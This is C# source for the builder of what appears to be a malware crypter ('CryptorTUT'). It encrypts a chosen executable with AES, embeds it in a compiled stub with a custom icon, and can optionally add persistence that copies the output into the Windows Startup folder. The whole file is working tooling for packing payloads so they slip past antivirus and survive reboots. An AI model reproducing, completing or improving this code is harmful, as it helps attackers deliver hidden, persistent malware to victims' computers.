using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Resources;
using System.Windows.Forms;

namespace CryptorTUT
{
    class SetupBuild
    {
        public string InputPath { get; set; }
        public string IconPath { get; set; }
        public string LocationPath { get; set; }
        public bool persistence { get; set; }

        public void Build()
        {
            Directory.CreateDirectory("temp");
            var fileNameWithoutExtension = Path.GetFileNameWithoutExtension(InputPath);
            var encryptedFileName = "Enc" + fileNameWithoutExtension + Path.GetExtension(InputPath);
            var outputPath = Path.Combine(LocationPath, encryptedFileName);

            CompilerParameters parameters = new CompilerParameters(new[] { "System.dll", "System.Windows.Forms.dll", "Microsoft.CSharp.dll", "System.Dynamic.Runtime.dll", "System.Core.dll" }, outputPath, true);
            parameters.GenerateExecutable = true;
            parameters.IncludeDebugInformation = false;
            parameters.TempFiles = new TempFileCollection("temp", false);

            if (!string.IsNullOrEmpty(IconPath))
            {
                parameters.CompilerOptions = " /platform:x86 /win32icon:" + IconPath + " /optimize";
            }
            else
            {
                parameters.CompilerOptions = " /platform:x86 /optimize";
            }

            var resourcePath = Path.Combine("temp", "Properties.resources");
            string aesKey = GenerateRandomString();

            using (ResourceWriter rw = new ResourceWriter(resourcePath))
            {
                rw.AddResource("Enc", Helper.AES_Encrypt(File.ReadAllBytes(InputPath), aesKey));
                rw.Generate();
            }

            parameters.EmbeddedResources.Add(resourcePath);

            string shellcode = Cryptor.Properties.Resources.shellcode;
            shellcode = shellcode.Replace("#AESKEY", aesKey);

            if (persistence)
            {
                shellcode = shellcode.Replace("//persistence", @"
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            // Copy the running file to the startup folder, if it doesn't already exist
            string runningFile = System.Reflection.Assembly.GetEntryAssembly().Location;
            string startupFile = Path.Combine(startupFolder, Path.GetFileName(runningFile));
            if (!File.Exists(startupFile))
            {
                File.Copy(runningFile, startupFile);
            }
            ");
            }

            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerResults result = csc.CompileAssemblyFromSource(parameters, shellcode);

            if (result.Errors.Count > 0)
            {
                string errors = "";
                foreach (CompilerError error in result.Errors)
                {
                    errors += error.ErrorText + "\n";
                }
                MessageBox.Show("Error While Compiling: \n" + errors, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("Build Successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Console.WriteLine("Output path: " + outputPath);
                File.Delete(resourcePath);
                Directory.Delete("temp", true);
            }

        }
        public string GenerateRandomString()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            var result = new string(
                Enumerable.Repeat(chars, 10)
                          .Select(s => s[random.Next(s.Length)])
                          .ToArray());
            return result;
        }




    }
}
